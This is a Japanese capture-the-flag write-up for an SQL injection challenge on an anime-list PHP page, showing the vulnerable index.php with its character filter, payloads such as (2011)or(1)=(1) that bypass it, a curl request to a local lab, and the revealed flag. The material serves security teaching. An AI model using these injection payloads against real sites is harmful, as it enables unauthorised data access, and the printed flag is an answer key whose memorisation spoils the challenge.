# SQL_challenge_1

```txt
今まで見たアニメのリストをデータベースに登録したよ。間違えて秘密の情報（FLAG）もデータベースに登録しちゃったけど、たぶん誰にも見られないし大丈夫だよね。

(Hint)

SQL injectionの問題です。

URLの「year=」の後に続く数字(年号)を適切な文字列に変更するとFLAGが表示されます。

一部使えない文字もあるのでソースコード(index.php)を参考に考えてみてください。

必要に応じてデータベースのスキーマ(1_schema.sql)も参考にしてください。

(注意)

sql-chall-1.zipは問題を解くために必須の情報ではなく、docker-composeを利用してローカルで問題環境を再現するためのものです。

興味のある方は利用してみてください。

writer : nkt
```

## Solution

問題にアクセスするとリストを選択して、該当の内容をリストで表示してくれるそうです。

試しに選択すると以下のようなパスでアクセスしてることがわかります。

```txt
http://localhost:8080/index.php?year=2011
```

配布フィアル(`index.php`)を見てみると、以下の部分に注目してみます。

```php
//urlの"year="の後に入力した文字列を$yearに入れる。
$year = $_GET["year"];

//一部の文字は利用出来ません。以下の文字を使わずにFLAGを手に入れてください。
if (preg_match('/\s/', $year))
    exit('危険を感知'); //スペース禁止
if (preg_match('/[\']/', $year))
    exit('危険を感知'); //シングルクォート禁止
if (preg_match('/[\/\\\\]/', $year))
    exit('危険を感知'); //スラッシュとバックスラッシュ禁止
if (preg_match('/[\|]/', $year))
    exit('危険を感知'); //バーティカルバー禁止                    

//クエリを作成する。
$query = "SELECT * FROM anime WHERE years =$year";

//debug用にhtmlのコメントにクエリを表示させる。
echo "<!-- debug : ", htmlspecialchars($query), " -->\n";

//結果を表示させる。
if ($result = $mysqli->query($query)) {
    while ($row = $result->fetch_assoc()) {
        echo '<tr><th>' . $row['name'] .  '</th><th>' . $row['years'] . '</th></tr>';
    }
    $result->close();
}
?>
```

以上のコードより、`' \/|` とスペースが制限されていることがわかります。

これらを使わずに SQL Injection ができれば良さそうです。

少し調べると `( ) ` や `"` で上手く実行できそうなことがわかります。

なので以下のように条件を真(true)にしてあげると、flagを得ることができます。

```txt
http://localhost:8080/index.php?year=(2011)or(1)=(1)
http://localhost:8080/index.php?year="2011"or"1"="1"
```

```shell
$ curl "http://localhost:8080/index.php?year=(2011)or(1)=(1)"
 ...
                    <!-- debug : SELECT * FROM anime WHERE years =(2011)or(1)=(1) -->
 ...
<tr><th>FLAG{53cur3_5ql_a283b4dffe}</th><th>123456789
 ...
</html>
```

## Flag

```txt
FLAG{53cur3_5ql_a283b4dffe}
```
